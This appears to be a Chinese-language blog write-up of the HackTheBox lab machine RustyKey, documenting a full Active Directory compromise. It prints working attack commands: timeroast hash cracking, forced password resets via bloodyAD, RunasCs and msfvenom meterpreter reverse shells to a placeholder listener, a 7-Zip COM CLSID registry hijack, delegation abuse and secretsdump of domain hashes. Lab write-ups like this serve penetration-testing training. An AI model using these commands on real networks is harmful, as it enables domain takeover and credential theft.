---
title: HTB-Rustykey WriteUp
published: 2025-10-30
description: HackTheBox Rustykey 通关记录。
image: http://imgur.41an.com/picgo/2025-11/app.hackthebox.com_machines_RustyKey.png
tags:
  - Penetration
  - PrivEsc
  - "#Windows"
category: 打靶日记
draft: false
lang: zh_CN
---
## 1. Recon
扫描端口
```shell
/usr/lib/nmap/nmap -sT -min-rates 10000 -iL ip.txt -oA nmapscan/ports -Pn
...

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```
将域名加入 hosts 文件解析
```shell
echo "10.10.11.75 rustykey.htb dc.rustykey.htb" >> /etc/hosts
```
同步时钟
```shell
ntpdate 10.10.11.75
```
配置 krb 文件
```shell
vim /etc/krb5.conf

[libdefaults]
  default_realm = RUSTYKEY.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  RUSTYKEY.HTB = {
    kdc = 10.10.11.75
    admin_server = 10.10.11.75
  }

[domain_realm]
  .rustykey.htb = RUSTYKEY.HTB
  rustykey.htb = RUSTYKEY.HTB
```
## 2. Foothold
已经题目给出的凭证，使用 `nxc` 判断目标服务支持的登录类型
![image.png](http://imgur.41an.com/picgo/2025-10/20251030113643020.png)
获取 TGT 查看共享，并未找到有利用价值的信息
```shell
impacket-getTGT 'RUSTYKEY.HTB/rr.parker:8#t5HE8L!W3A'
export KRB5CCNAME=rr.parker.ccache
impacket-smbclient -k -no-pass RUSTYKEY.HTB/rr.parker@dc.rustykey.htb 
```
尝试 timeroast
```shell
nxc smb dc.rustykey.htb -M timeroast
```

![image.png](http://imgur.41an.com/picgo/2025-10/20251030170355719.png)
将获取到的 hash 进行爆破 (需要 **hashcat v7.1.2**)
```
hashcat -a 0 -m 31300 hashs.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
...
$sntp-ms$f3d22c6f9277010a267f2843b03f777d$1c0111e900000000000af2164c4f434cecacd4f92e8d0536e1b8428bffbfcd0aecae1421e284a515ecae1421e284eb8c:Rusty88!                       
...
```
根据 RID 搜索到用户 `IT-COMPUTER3.RUSTYKEY.HTB`
![image.png](http://imgur.41an.com/picgo/2025-10/20251030170326076.png)
信息收集一波
```shell
bloodhound-python -u 'IT-COMPUTER3' -p 'Rusty88!' -d rustykey.htb -ns 10.10.11.75 -c All --zip 
```
这边可见一条路线

![image.png](http://imgur.41an.com/picgo/2025-10/20251030170710406.png)
但最终`EE.REED` 用户无法登陆，发现 `BB.MORGAN@RUSTYKEY.HTB` 属于 `IT` 组，该组同样可远程管理域控

![image.png](http://imgur.41an.com/picgo/2025-10/20251030205058166.png)
且 `HELPDESK@RUSTYKEY.HTB` 对 `BB.MORGAN@RUSTYKEY.HTB` 有 `ForceChangePassword` 权限

![image.png](http://imgur.41an.com/picgo/2025-10/20251030205147941.png)

`AddSelf`，将 `IT-COMPUTER3$` 添加至 `HELPDESK` 组中
```shell
bloodyAD -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' -k --dc-ip 10.10.11.75 --host dc.rustykey.htb add groupMember 'CN=HELPDESK,CN=USERS,DC=RUSTYKEY,DC=HTB' IT-COMPUTER3$
```
`ForceChangePassword`，修改 `BB.MORGAN` 口令
```
bloodyAD -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' -k --dc-ip 10.10.11.75 --host dc.rustykey.htb set password BB.MORGAN '1qaz!QAZ'
```
直接登录发现加密类型不支持
![image.png](http://imgur.41an.com/picgo/2025-10/20251030211702963.png)
发现 `IT` 在保护组之下

![image.png](http://imgur.41an.com/picgo/2025-10/20251031092956457.png)
移出保护组
```shell
bloodyAD -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' -k --dc-ip 10.10.11.75 --host dc.rustykey.htb remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' IT
```
登录 bb 用户
```shell
impacket-getTGT 'RUSTYKEY.HTB/bb.morgan:1qaz!QAZ'
export KRB5CCNAME=bb.morgan.ccache
evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB -k bb.morgan.ccache
```
## 3. PrivEsc
在桌面中发现 `internal.pdf`
```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> ls ../Desktop

    Directory: C:\Users\bb.morgan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---       10/31/2025  11:02 AM             34 user.txt
```
将其下载
```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> download ../Desktop/internal.pdf
```
大致意思为，`support` 组有使用加解压功能的权利，且可以控制相关的注册表

![image.png](http://imgur.41an.com/picgo/2025-11/20251101172237377.png)

修改 `EE` 口令，并将 `SUPPORT` 移出 `PROTECTED` 组
```shell
bloodyAD -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' -k --dc-ip 10.10.11.75 --host dc.rustykey.htb set password EE.REED '1qaz!QAZ'
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT' 
```
虽 `EE.REED` 与 `BB.MORGAN` 同属 `PROTECTED` 组，但将 `EE.REED` 移出该组后仍无法登录。

![image.png](http://imgur.41an.com/picgo/2025-11/20251101175526276.png)

因此，尝试使用 `Runascs.exe` 反弹 shell
```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload RunasCS.exe
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> .\RunasCS.exe ee.reed 1qaz!QAZ powershell.exe -r YOUR_IP:YOUR_PORT
```
监听端口，接收反弹 shell

![image.png](http://imgur.41an.com/picgo/2025-11/20251101175707624.png)

递归查询与 `zip` 相关的 `COM` 组件，发现已有一个 `C:\Program Files\7-Zip\7-zip.dll`
```powershell
PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

End of search: 14 match(es) found.
```
制作带有反弹 shell 功能的 dll
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o rev.dll
```

监听
```shell
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LPORT YOUR_PORT
msf6 exploit(multi/handler) > set LHOST YOUR_IP
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
上传恶意 dll，并用其替换 `C:\Program Files\7-Zip\7-zip.dll`
```
PS C:\Windows\system32> mkdir C:\temp
PS C:\Windows\system32> cd C:\temp
PS C:\Windows\system32> upload rev.dll
PS C:\temp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\temp\rev.dll" /f
The operation completed successfully.
```
成功接收

![image.png](http://imgur.41an.com/picgo/2025-11/20251101180833199.png)
继续使用 sharphound 收集域内信息
```powershell
PS C:\Windows> upload sharphound.ps1
PS C:\Windows> Import-Module .\SharpHound.ps1
PS C:\Windows> Invoke-BloodHound -CollectionMethod All -ZipFileName C:\temp\res.zip
```
发现 `MM.TURNER` 对 `DC` 具有 `AddAllowToAct` 权限
```shell
PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```
可以在此直接输出 flag
```shell
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
impacket-wmiexec -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
```
转储 administrator hash
```
impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
```
---
## 4. Reference

[timeroasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/timeroasting?utm_source=chatgpt.com)